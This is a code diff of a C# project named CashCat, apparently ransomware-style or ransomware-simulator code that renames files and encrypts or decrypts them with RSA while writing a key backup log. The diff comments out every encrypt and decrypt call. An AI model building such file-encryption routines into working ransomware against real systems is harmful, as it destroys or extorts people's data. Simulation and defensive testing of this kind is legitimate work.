@@ -43,7 +43,6 @@ namespace CashCat
             string currentdatetime = (DateTime.Now.ToString("yyyy-dd-M-HH-mm-ss") + "-KEY.log");
             var keylogfile = File.Create(currentdatetime);
             
-
             using (StreamWriter outputFile = new StreamWriter(keylogfile))
             {
                 outputFile.WriteLine("Welcome to your CashCat Key Backup Log File!");
@@ -99,7 +98,7 @@ namespace CashCat
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
-                FileEncrypter.EncryptFileRSA(newfilefullname);
+                //FileEncrypter.EncryptFileRSA(newfilefullname);
             }
             catch
             {
@@ -123,7 +122,7 @@ namespace CashCat
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
-                    FileEncrypter.EncryptFileRSA(newfilefullname);
+                    //FileEncrypter.EncryptFileRSA(newfilefullname);
                 }
                 catch
                 {
@@ -142,7 +141,7 @@ namespace CashCat
             try
             {
                 System.IO.File.Move(file.Name, newfilename);
-                FileEncrypter.DecryptFileRSA(newfilefullname);
+                //FileEncrypter.DecryptFileRSA(newfilefullname);
 
             }
             catch
@@ -164,7 +163,7 @@ namespace CashCat
                 try
                 {
                     System.IO.File.Move(file.Name, newfilename);
-                    FileEncrypter.DecryptFileRSA(newfilefullname);
+                    //FileEncrypter.DecryptFileRSA(newfilefullname);
 
                 }
                 catch
